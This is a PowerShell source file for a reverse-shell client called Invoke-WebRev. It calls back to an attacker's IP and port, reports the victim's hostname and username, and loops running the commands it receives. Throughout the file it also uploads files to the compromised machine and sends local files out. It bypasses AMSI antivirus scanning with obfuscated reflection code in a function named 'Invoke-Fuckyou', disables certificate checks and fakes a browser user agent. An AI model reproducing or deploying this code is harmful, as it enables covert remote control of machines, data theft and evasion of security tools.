function Invoke-WebRev{
    param
    (
        [string]$ip,
        [string]$port,
        [switch]$ssl
    )

    $help=@"

.SYNOPSIS
    WebRev.
    PowerShell Function: Invoke-WebRev
    Author: Hector de Armas (3v4Si0N)

    Dependencias Requeridas: Ninguna
    Dependencias Opcionales: Ninguna
.DESCRIPTION
    .

.ARGUMENTS
    -ip   <IP>      Remote Host
    -port <PORT>    Remote Port
    -ssl            Send traffic over ssl

.EXAMPLE
    Invoke-Webrev -ip 192.168.29.131 -port 80
    Invoke-Webrev -ip 192.168.29.131 -port 443 -ssl
"@

    if(-not $ip -or -not $port) { return $help; }
    
    if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
    $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);
    Invoke-Fuckyou;
    $pwd_b64 = getPwd;
    $hname = toBase64 -str "$env:computername";
    $cuser = toBase64 -str "$env:username";

    $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}';
    
    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy();
    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
    $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
    [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    try { $error[0] = ""; } catch {}

    while ($true)
    {
        try
        {
            $req = Invoke-WebRequest $url -useb -Method POST -Body $json -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" -ContentType "application/json";
            $header = $req.Headers["Authorization"];
            $c = [System.Convert]::FromBase64String($header);
            $cstr = [System.Text.Encoding]::UTF8.GetString($c);
            $result = "";
            $dataToSend = "";

            if($cstr.split(" ")[0] -eq "upload")
            {
                $type = '"type":"UPL04D"';
                try
                {
                    $uploadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
                    if ($cstr.split(" ").Length -eq 3) {
                        $location = $cstr.split(" ")[2];
                    }
                    elseif ($cstr.Substring($cstr.Length-1) -eq '"') {
                        $location = $cstr.split('"') | Select-Object -SkipLast 1 | Select-Object -Last 1;
                    }
                    else {
                        $location = $cstr.split(' ') | Select-Object -Last 1;;
                    }
                    $content = [System.Convert]::FromBase64String($uploadData);
                    $content | Set-Content $location -Encoding Byte
                    $result = '[+] File successfully uploaded.';
                }
                catch {}
            }
            elseif($cstr.split(" ")[0] -eq "download")
            {
                $type = '"type":"D0WNL04D"';
                try
                {
                    if ($cstr.split(" ").Length -eq 3){
                        $cstr = $cstr.Replace('"', '');
                        $pathSrc = $cstr.split(" ")[1];
                        $pathDst = $cstr.split(" ")[2];
                    }
                    elseif ($cstr.Substring($cstr.Length-1) -eq '"'){
                        if ($cstr.split(' ')[1][0] -eq '"') {
                            $pathSrc = $cstr.split('"')[1];
                        } else {
                            $pathSrc = $cstr.split(' ')[1];
                        }
                        $pathDst = $cstr.split('"')[-2];
                    }
                    else{
                        $pathSrc = $cstr.split('"')[1];
                        $pathDst = $cstr.split(' ')[-1];
                    }

                    if (Test-Path -Path $pathSrc) 
                    {
                        $downloadData = [System.IO.File]::ReadAllBytes($pathSrc);
                        $b64 = [System.Convert]::ToBase64String($downloadData);
                        $result = '[+] File successfully downloaded.", ' + '"file":"' + $b64 + '", ' + '"pathDst":"' + $pathDst;
                    } 
                    else
                    {
                        $type = '"type":"3RR0R"';
                        $result = '[!] Source file not found!';
                    }
                }
                catch {}
            }
            else
            {
                $type = '"type":"C0MM4ND"';                
                $enc = [system.Text.Encoding]::UTF8;
                $new = (taleska-ei-vrixeka $cstr | Out-String);

                $bytes = $enc.GetBytes($new);
                $bytes2 = $enc.GetBytes($result);
                $result = [Convert]::ToBase64String($bytes2 + $bytes);
            }

            if ($cstr.split(" ")[0] -eq "cd") {
                $pwd_b64 = getPwd;
            }
            $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '"}';
        }
        catch
        {
            if ($error[0] -ne "")
            {
                try
                {
                    $type = '"type":"3RR0R"';
                    $err = $error[0] | Out-String;
                    $error[0]= "";

                    $bytes = $enc.GetBytes($err);
                    $result = [Convert]::ToBase64String($bytes);
                    $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}'
                } catch {}
            }
        };
    };
}

function toBase64
{
    Param([String] $str)

    $enc = [system.Text.Encoding]::UTF8;
    $bytes = $enc.GetBytes($str);
    $result = [Convert]::ToBase64String($bytes);
    return $result;
}

function getPwd()
{
    $enc = [system.Text.Encoding]::UTF8;
    $pwd = "pwd | Format-Table -HideTableHeaders";
    $pwd_res = (taleska-ei-vrixeka $pwd | Out-String);
    $bytes = $enc.GetBytes($pwd_res);
    $pwd_b64 = [Convert]::ToBase64String($bytes);
    return $pwd_b64;
}


function Invoke-Fuckyou
{
    [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('Syste' + 'm.Ref' + 'lect' + 'ion.Bi' + 'ndi' + 'ngF' + 'lags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('Syste' + 'm.Typ' + 'e')), [Object]([Ref].Assembly.GetType('Syste' + 'm.Man' + 'agemen' + 't.Automa' + 'tion.Am' + 'siU' + 'ti' + 'ls')),('GetF' + 'ield')).Invoke('am' + 'siIn' + 'itFai' + 'led',(('NonPu' + 'blic,S' + 'tatic') -as [String].Assembly.GetType('Syste' + 'm.Refl' + 'ection.B' + 'indingF' + 'lags'))).SetValue($null,$True)
}

#Invoke-WebRev -ip 192.168.230.128 -port 80
